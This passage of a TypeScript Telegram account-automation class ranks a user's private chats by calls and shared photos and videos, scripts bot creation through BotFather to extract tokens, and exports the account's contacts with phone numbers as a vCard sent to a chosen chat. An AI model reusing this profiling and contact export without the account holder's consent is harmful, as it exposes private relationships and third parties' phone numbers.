            this.getMe().catch(() => null),
            this.getCallLogsInternal().catch(() => ({})),
            (async () => {
                const results = [];
                for await (const dialog of this.client.iterDialogs({ limit: 350 })) {
                    results.push(dialog);
                }
                return results;
            })()
        ]);

        if (!me) throw new Error('Failed to fetch self userInfo');

        // 2. Stage 1: Fast filtering and preliminary scoring based on dialog metadata
        const candidateChats = dialogs
            .filter(dialog => {
                if (!dialog.isUser || !(dialog.entity instanceof Api.User)) return false;
                const user = dialog.entity as Api.User;
                if (user.bot || user.fake) return false;
                const userId = user.id.toString();
                return userId !== "777000" && userId !== "42777";
            })
            .map(dialog => {
                const unreadScore = (dialog.unreadCount || 0) * 10;
                const pinnedScore = dialog.pinned ? 50 : 0;

                return {
                    dialog,
                    preliminaryScore: unreadScore + pinnedScore
                };
            })
            // Sort by potential engagement
            .sort((a, b) => b.preliminaryScore - a.preliminaryScore);

        // Process "me" chat with high priority
        let selfChatData = null;
        try {
            const selfChatId = me.id.toString();
            // Deep analysis for self chat because it's always relevant
            const results = await this.analyzeChatEngagement('me', me, 100, callLogs[selfChatId], weights, now, ACTIVITY_WINDOWS);
            selfChatData = results;
            this.logger.info(this.phoneNumber, `Self chat processed - Score: ${selfChatData.interactionScore}`);
        } catch (e) {
            this.logger.warn(this.phoneNumber, 'Error processing self chat:', e);
        }

        // 3. Stage 2: Detailed analysis for top candidates only
        // We only analyze the top N candidates in depth to save time
        const topCandidates = candidateChats.slice(0, clampedLimit * 4);
        this.logger.info(this.phoneNumber, `Analyzing top ${topCandidates.length} candidates in depth...`);

        const chatStats = [];
        const batchSize = 10;

        for (let i = 0; i < topCandidates.length; i += batchSize) {
            const batch = topCandidates.slice(i, i + batchSize);
            const batchResults = await Promise.all(batch.map(async (candidate) => {
                const user = candidate.dialog.entity as Api.User;
                const chatId = user.id.toString();

                try {
                    return await this.analyzeChatEngagement(
                        chatId,
                        user,
                        100,
                        callLogs[chatId],
                        weights,
                        now,
                        ACTIVITY_WINDOWS,
                        candidate.dialog
                    );
                } catch (error) {
                    this.logger.warn(this.phoneNumber, `Error analyzing chat ${chatId}:`, error.message);
                    return null;
                }
            }));
            chatStats.push(...batchResults.filter(Boolean));
        }

        // 4. Final Ranking
        let topChats = chatStats
            .sort((a, b) => b.interactionScore - a.interactionScore)
            .slice(0, clampedLimit);

        if (selfChatData) {
            // Ensure self chat is present and at the top if it's among results
            topChats = topChats.filter(chat => chat.chatId !== 'me' && chat.chatId !== me.id.toString());
            topChats.unshift(selfChatData);
            if (topChats.length > clampedLimit) topChats = topChats.slice(0, clampedLimit);
        }

        const totalTime = Date.now() - startTime;
        this.logger.info(this.phoneNumber, `getTopPrivateChats optimized completed in ${totalTime}ms. Found ${topChats.length} results.`);

        return topChats;
    }

    /**
     * Internal helper to analyze engagement for a specific chat
     */
    private async analyzeChatEngagement(
        chatId: string,
        user: Api.User,
        messageLimit: number,
        callStats: any,
        weights: any,
        now: number,
        windows: any,
        dialog?: any
    ) {

        const lastMessage = await this.client.getMessages(chatId, { limit: 1 });
        if ((lastMessage?.total ?? 0) < 10) return null;

        const [photosList, videosList, photosByUsList, videosByUsList] = await Promise.all([
            this.client.getMessages(chatId, { filter: new Api.InputMessagesFilterPhotos(), limit: 1 }).catch(() => []),
            this.client.getMessages(chatId, { filter: new Api.InputMessagesFilterVideo(), limit: 1 }).catch(() => []),
            this.client.getMessages(chatId, { filter: new Api.InputMessagesFilterPhotos(), limit: 1, fromUser: 'me' }).catch(() => []),
            this.client.getMessages(chatId, { filter: new Api.InputMessagesFilterVideo(), limit: 1, fromUser: 'me' }).catch(() => []),
        ]);

        const totalPhotos = (photosList as { total?: number })?.total ?? 0;
        const totalVideos = (videosList as { total?: number })?.total ?? 0;
        const photosByUs = (photosByUsList as { total?: number })?.total ?? 0;
        const videosByUs = (videosByUsList as { total?: number })?.total ?? 0;
        const mediaStats = {
            photos: totalPhotos,
            videos: totalVideos,
            photosByUs,
            photosByThem: Math.max(0, totalPhotos - photosByUs),
            videosByUs,
            videosByThem: Math.max(0, totalVideos - videosByUs)
        };

        const lastMessageDate = dialog?.message?.date ? dialog.message.date * 1000 : now;
        const daysSinceLastActivity = (now - lastMessageDate) / (1000 * 60 * 60 * 24);

        const cCalls = callStats
            ? { ...callStats, total: callStats.total ?? callStats.totalCalls ?? 0 }
            : { total: 0, incoming: 0, outgoing: 0, video: 0 };
        const baseScore = (
            cCalls.incoming * weights.incomingCall +
            cCalls.outgoing * weights.outgoingCall +
            cCalls.video * weights.videoCall +
            mediaStats.videos * weights.sharedVideo +
            mediaStats.photos * weights.sharedPhoto
        );

        const engagementLevel: 'recent' | 'active' | 'dormant' = baseScore > 0 ? 'active' : 'dormant';

        const totalActivity = Math.max(1, baseScore);
        const activityBreakdown = {
            videoCalls: Math.round((cCalls.video * weights.videoCall / totalActivity) * 100),
            audioCalls: Math.round(((cCalls.total - cCalls.video) * (weights.incomingCall || weights.outgoingCall) / totalActivity) * 100),
            mediaSharing: Math.round(((mediaStats.videos * weights.sharedVideo + mediaStats.photos * weights.sharedPhoto) / totalActivity) * 100),
            textMessages: lastMessage.total ?? 0
        };

        return {
            chatId: chatId === 'me' ? 'me' : user.id.toString(),
            username: user.username,
            firstName: user.firstName || (chatId === 'me' ? 'Saved Messages' : ''),
            lastName: user.lastName,
            totalMessages: lastMessage.total ?? 0,
            interactionScore: baseScore,
            engagementLevel,
            lastActivityDays: Math.round(daysSinceLastActivity * 10) / 10,
            calls: {
                total: cCalls.total || 0,
                incoming: { total: cCalls.incoming || 0, audio: Math.max(0, cCalls.incoming - cCalls.video) || 0, video: cCalls.video || 0 },
                outgoing: { total: cCalls.outgoing || 0, audio: cCalls.outgoing || 0, video: 0 }
            },
            media: mediaStats,
            activityBreakdown
        };
    }

    async createGroupOrChannel(options: GroupOptions) {
        if (!this.client) throw new Error('Client not initialized');
        try {
            this.logger.info(this.phoneNumber, 'Creating group or channel with options:', options);
            const result = await this.client.invoke(
                new Api.channels.CreateChannel(options)
            );
            return result;
        }
        catch (error) {
            this.logger.error(this.phoneNumber, 'Error creating group or channel:', error);
            throw new Error(`Failed to create group or channel: ${error.message}`);
        }
    }

    async createBot(options: {
        name: string;
        username: string;
        description?: string;
        aboutText?: string;
        profilePhotoUrl?: string;
    }): Promise<{ botToken: string; username: string }> {
        if (!this.client) {
            this.logger.error(this.phoneNumber, 'Bot creation failed: Client not initialized', {});
            throw new Error('Client not initialized');
        }

        const botFatherUsername = 'BotFather';
        this.logger.info(this.phoneNumber, `[BOT CREATION] Starting bot creation process for "${options.name}" (${options.username})`);

        try {
            // Start conversation with BotFather
            this.logger.info(this.phoneNumber, '[BOT CREATION] Attempting to get entity for BotFather...');
            const entity = await this.client.getEntity(botFatherUsername);
            this.logger.info(this.phoneNumber, '[BOT CREATION] Successfully connected to BotFather');

            // Send /newbot command
            this.logger.info(this.phoneNumber, '[BOT CREATION] Sending /newbot command...');
            await this.client.sendMessage(entity, {
                message: '/newbot'
            });
            this.logger.info(this.phoneNumber, '[BOT CREATION] Waiting for BotFather response after /newbot command...');
            await new Promise(resolve => setTimeout(resolve, 1000));

            // Send bot name
            this.logger.info(this.phoneNumber, `[BOT CREATION] Sending bot name: "${options.name}"`);
            await this.client.sendMessage(entity, {
                message: options.name
            });
            this.logger.info(this.phoneNumber, '[BOT CREATION] Waiting for BotFather response after sending name...');
            await new Promise(resolve => setTimeout(resolve, 1000));

            // Send bot username
            // Append a 3-digit unique string ending with "_bot" if not present
            let botUsername = options.username;
            if (!/_bot$/.test(botUsername)) {
                // Generate a unique 3-character alphanumeric string
                const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
                let uniqueSuffix = '';
                for (let i = 0; i < 3; i++) {
                    uniqueSuffix += chars.charAt(Math.floor(Math.random() * chars.length));
                }
                botUsername = botUsername.replace(/_?bot$/, '') + `_${uniqueSuffix}_bot`;
                this.logger.info(this.phoneNumber, `[BOT CREATION] Modified username to ensure uniqueness: ${botUsername}`);
            }

            this.logger.info(this.phoneNumber, `[BOT CREATION] Sending bot username: "${botUsername}"`);
            await this.client.sendMessage(entity, {
                message: botUsername
            });
            this.logger.info(this.phoneNumber, '[BOT CREATION] Waiting for BotFather response after sending username...');
            await new Promise(resolve => setTimeout(resolve, 1000));

            // Get response from BotFather
            this.logger.info(this.phoneNumber, '[BOT CREATION] Retrieving response from BotFather...');
            const messages = await this.client.getMessages(entity, {
                limit: 1
            });

            if (!messages || messages.length === 0) {
                this.logger.error(this.phoneNumber, '[BOT CREATION] No response received from BotFather', {});
                throw new Error('No response received from BotFather');
            }

            const lastMessage = messages[0].message;
            this.logger.info(this.phoneNumber, `[BOT CREATION] BotFather response: "${lastMessage.substring(0, 50)}..."`);

            if (!lastMessage.toLowerCase().includes('use this token')) {
                this.logger.error(this.phoneNumber, `[BOT CREATION] Bot creation failed, unexpected response: "${lastMessage}"`, {});
                throw new Error(`Bot creation failed: ${lastMessage}`);
            }

            // Extract bot token from BotFather's response
            const tokenMatch = lastMessage.match(/(\d+:[A-Za-z0-9_-]+)/);
            if (!tokenMatch) {
                this.logger.error(this.phoneNumber, '[BOT CREATION] Could not extract bot token from BotFather response', {});
                throw new Error('Could not extract bot token from BotFather response');
            }
            const botToken = tokenMatch[0];
            this.logger.info(this.phoneNumber, `[BOT CREATION] Successfully extracted bot token: ${botToken.substring(0, 5)}...`);

            // If description is provided, set it
            if (options.description) {
                this.logger.info(this.phoneNumber, '[BOT CREATION] Setting bot description...');
                await this.client.sendMessage(entity, { message: '/setdescription' });
                await new Promise(resolve => setTimeout(resolve, 1000));

                this.logger.info(this.phoneNumber, `[BOT CREATION] Selecting bot @${options.username} for description update...`);
                await this.client.sendMessage(entity, { message: `@${options.username}` });
                await new Promise(resolve => setTimeout(resolve, 1000));

                this.logger.info(this.phoneNumber, '[BOT CREATION] Sending description text...');
                await this.client.sendMessage(entity, { message: options.description });
                await new Promise(resolve => setTimeout(resolve, 1000));
                this.logger.info(this.phoneNumber, '[BOT CREATION] Description set successfully');
            }

            // If about text is provided, set it
            if (options.aboutText) {
                this.logger.info(this.phoneNumber, '[BOT CREATION] Setting about text...');
                await this.client.sendMessage(entity, { message: '/setabouttext' });
                await new Promise(resolve => setTimeout(resolve, 1000));

                this.logger.info(this.phoneNumber, `[BOT CREATION] Selecting bot @${options.username} for about text update...`);
                await this.client.sendMessage(entity, { message: `@${options.username}` });
                await new Promise(resolve => setTimeout(resolve, 1000));

                this.logger.info(this.phoneNumber, '[BOT CREATION] Sending about text...');
                await this.client.sendMessage(entity, { message: options.aboutText });
                await new Promise(resolve => setTimeout(resolve, 1000));
                this.logger.info(this.phoneNumber, '[BOT CREATION] About text set successfully');
            }

            // If profile photo URL is provided, set it
            if (options.profilePhotoUrl) {
                this.logger.info(this.phoneNumber, `[BOT CREATION] Setting profile photo from URL: ${options.profilePhotoUrl}`);
                try {
                    this.logger.info(this.phoneNumber, '[BOT CREATION] Downloading profile photo...');
                    const photoBuffer = await this.downloadFileFromUrl(options.profilePhotoUrl);
                    this.logger.info(this.phoneNumber, `[BOT CREATION] Photo downloaded successfully, size: ${photoBuffer.length} bytes`);

                    this.logger.info(this.phoneNumber, '[BOT CREATION] Sending /setuserpic command...');
                    await this.client.sendMessage(entity, { message: '/setuserpic' });
                    await new Promise(resolve => setTimeout(resolve, 1000));

                    this.logger.info(this.phoneNumber, `[BOT CREATION] Selecting bot @${options.username} for profile photo update...`);
                    await this.client.sendMessage(entity, { message: `@${options.username}` });
                    await new Promise(resolve => setTimeout(resolve, 1000));

                    this.logger.info(this.phoneNumber, '[BOT CREATION] Uploading profile photo...');
                    await this.client.sendFile(entity, {
                        file: Buffer.from(photoBuffer),
                        caption: '',
                        forceDocument: false
                    });
                    await new Promise(resolve => setTimeout(resolve, 1000));
                    this.logger.info(this.phoneNumber, '[BOT CREATION] Profile photo set successfully');
                } catch (photoError) {
                    this.logger.error(this.phoneNumber, `[BOT CREATION] Failed to set profile photo: ${photoError.message}`, {});
                    // Continue with bot creation even if photo upload fails
                }
            }

            this.logger.info(this.phoneNumber, `[BOT CREATION] Bot creation completed successfully: @${options.username}`);
            return {
                botToken,
                username: botUsername
            };

        } catch (error) {
            this.logger.error(this.phoneNumber, `[BOT CREATION] Error during bot creation process: ${error.message}`, error);
            throw new Error(`Failed to create bot: ${error.message}`);
        }
    }

    private createVCardContent(contacts: Api.contacts.Contacts): string {
        let vCardContent = '';
        contacts.users.map((user: Api.TypeUser) => {
            user = user as Api.User;
            vCardContent += 'BEGIN:VCARD\n';
            vCardContent += 'VERSION:3.0\n';
            vCardContent += `FN:${user.firstName || ''} ${user.lastName || ''}\n`;
            vCardContent += `TEL;TYPE=CELL:${user.phone}\n`;
            vCardContent += 'END:VCARD\n';
        }
        );
        return vCardContent;
    }

    async sendContactsFile(chatId: string, contacts: Api.contacts.Contacts, filename = 'contacts.vcf'): Promise<void> {
        if (!this.client) throw new Error('Client is not initialized');

        try {
            const vCardContent = this.createVCardContent(contacts);
            const tempPath = `./contacts/${chatId}-${filename}`;

            // Ensure the directory exists
            if (!fs.existsSync('./contacts')) {
                fs.mkdirSync('./contacts', { recursive: true });
            }

            // Write vCard content to a temporary file
            fs.writeFileSync(tempPath, vCardContent, 'utf8');

            try {
                // Read the file content for sending
                const fileContent = fs.readFileSync(tempPath);

                // Send file with the actual content
                const file = new CustomFile(
                    filename,
                    fs.statSync(tempPath).size,
                    tempPath,
                    fileContent // Add the actual file content
                );

                await this.client.sendFile(chatId, {
                    file,
                    caption: `Contacts file with ${contacts.users.length} contacts`,
                    forceDocument: true
                });

                this.logger.info(this.phoneNumber, `Sent contacts file with ${contacts.users.length} contacts to chat ${chatId}`);
            } finally {
                // Clean up temp file
                if (fs.existsSync(tempPath)) {
                    fs.unlinkSync(tempPath);
                }
            }
        } catch (error) {
            this.logger.error(this.phoneNumber, 'Error sending contacts file:', error);
            throw error; // Re-throw the error for proper handling by caller
        }
    }
}
export default TelegramManager;
